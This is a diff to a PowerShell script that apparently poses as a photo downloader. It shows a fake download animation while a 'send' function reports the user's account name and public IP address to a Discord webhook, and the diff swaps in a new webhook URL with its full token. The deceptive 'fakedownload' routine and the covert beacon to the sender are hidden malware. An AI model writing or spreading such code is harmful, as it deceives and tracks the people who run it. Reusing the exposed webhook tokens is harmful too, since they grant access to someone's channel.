@@ -2,7 +2,7 @@ function send {
     param (
         [string]$msg
     )
-    $webhookurl = "https://discord.com/api/webhooks/1259185021613506561/Bp2soK5zsyY-iwOjKJBHH3DxydpNS8tcJfbqdD8ekv7YkLH784GO4GBic_2Nh-onnHDs" 
+    $webhookurl = "https://discord.com/api/webhooks/1269884812253073533/3dx2RgG4KprVV0oYFPvronJ82s2OB_9AKswYhh-mRdeL4c3HV5STy2bUpM-F_H7TnZD_" 
     if ($msg -eq "triggered") {
         $name = whoami
         $ip = (Invoke-WebRequest -Uri "https://api.ipify.org/?format=text").Content
@@ -20,7 +20,7 @@ function send {
 
 function fakedownload {
     Write-Host "creating directory for download"
-    New-Item -Name "photos" -ItemType Directory
+    New-Item -Name "pics" -ItemType Directory
     Write-Host "`n"
     Write-Host "created"
     $anim = @('|', '/', '-', '\')
@@ -51,11 +51,12 @@ function fakedownload {
 	    Write-Host "                      `r" -NoNewline
     }
     Write-Host "starting download ..."
-    $ppath = "$PSScriptRoot\photos\"
+    $path = "$PSScriptRoot"
+    $a = "\pics"
     #New-Item -Name "readme.txt" -Path $ppath -ItemType File
     $ImageURL = "https://i.imgur.com/2Qk9Cjq.jpeg"
-    $OutputFilePath = "$ppath\image.jpg"
-
+    $iname = "\image.jpeg"
+    $OutputFilePath = $path + $a + $iname
     Invoke-WebRequest -Uri $ImageURL -OutFile $OutputFilePath
     Write-Host "report any errors back to the sender of this program`n"
     Write-Host "`nsuccessfully downloaded, program will close shortly" -ForegroundColor 'Green'
